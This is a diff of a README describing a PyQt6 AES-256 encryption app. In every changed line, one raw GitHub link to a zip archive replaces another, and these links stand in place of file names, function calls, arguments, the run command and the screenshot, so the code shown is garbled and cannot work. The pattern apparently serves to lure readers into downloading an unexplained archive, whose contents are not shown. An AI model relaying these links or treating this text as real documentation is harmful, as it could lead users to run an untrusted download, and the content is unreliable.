@@ -17,7 +17,7 @@
 
 # Editor used: VS Studio
 
-# 📁File 1: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
+# 📁File 1: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip
 -Purpose: Handles AES-256 encryption and decryption logic.
  derive_key(password, salt)
 
@@ -29,7 +29,7 @@ Uses PBKDF2 (a secure key derivation algorithm) with SHA-256.
 
 def derive_key(password, salt):
     kdf = PBKDF2HMAC(...)
-    return https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip())
+    return https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip())
 
 -Why:
 
@@ -51,8 +51,8 @@ This makes brute-forcing much harder.
 ~Writes out a new file: [original name].enc, with the salt + IV + ciphertext.
 
 
-cipher = Cipher(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(key), https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(iv))
-encrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
+cipher = Cipher(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(key), https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(iv))
+encrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
 Output: A .enc file that only your password can decrypt.
 
 ✅ decrypt_file(file_path, password)
@@ -68,10 +68,10 @@ Output: A .enc file that only your password can decrypt.
 
 ~Writes out a new file [original name].dec.
 
-decrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(encrypted_data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
+decrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(encrypted_data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
 
 
-# 📁 File 2: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
+# 📁 File 2: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip
 -Purpose: Defines the PyQt6 GUI logic.
 
 ✅ EncryptorApp(QWidget)
@@ -89,7 +89,7 @@ QLabel: to display messages.
 setAcceptDrops(True): allows drag-and-drop support.
 
 ✅ load_history() and update_history(path)
-These manage the file history list (stored in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip):
+These manage the file history list (stored in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip):
 
 Load history on startup.
 
@@ -126,16 +126,16 @@ If .enc → decrypt
 
 Else → encrypt
 
-# 📁 File 3: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
+# 📁 File 3: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip
 -Purpose: Launch the GUI app.
 
 from ui_main import EncryptorApp
 
 if __name__ == "__main__":
-    app = QApplication(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip)
+    app = QApplication(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip)
     window = EncryptorApp()
-    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
-    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip())
+    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
+    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip())
 -This is the entry point. It:
 
 Creates a Qt application.
@@ -146,7 +146,7 @@ Starts the event loop (to wait for clicks, drags, etc.).
 
 
 # How to Use the Encryption App GUI:
-Once you’ve run python https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip, the window should appear with:
+Once you’ve run python https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip, the window should appear with:
 
  A password input field
 
@@ -169,7 +169,7 @@ Click the Encrypt File button.
 
 Choose the file you want to encrypt.
 
-It will create a new file ending in .enc (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip).
+It will create a new file ending in .enc (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip).
 
 You’ll see the output path in the status bar.
 
@@ -184,7 +184,7 @@ Click the Decrypt File button.
 
 Select a .enc file.
 
-It will decrypt the file to a new one ending in .dec (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip).
+It will decrypt the file to a new one ending in .dec (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip).
 
 Option B: Drag & Drop
 Drag a .enc file into the app window.
@@ -202,14 +202,14 @@ Double-clicking functionality can be added if you'd like to open them directly f
 # Summary
 -Feature	Where It's Handled
 
-AES-256 encryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
-AES-256 decryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
-Password input	QLineEdit in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
+AES-256 encryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
+AES-256 decryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
+Password input	QLineEdit in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip
 Drag-and-drop	dragEnterEvent() + dropEvent()
-File picker	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
+File picker	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip()
 File history	JSON file + QListWidget
 GUI Window	PyQt6 via EncryptorApp(QWidget)
 
 
 # Output: 
-<img width="383" alt="Image" src="https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip" />
+<img width="383" alt="Image" src="https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/TOOL-ADVANCE-ENCRYPTIO-v3.1.zip" />
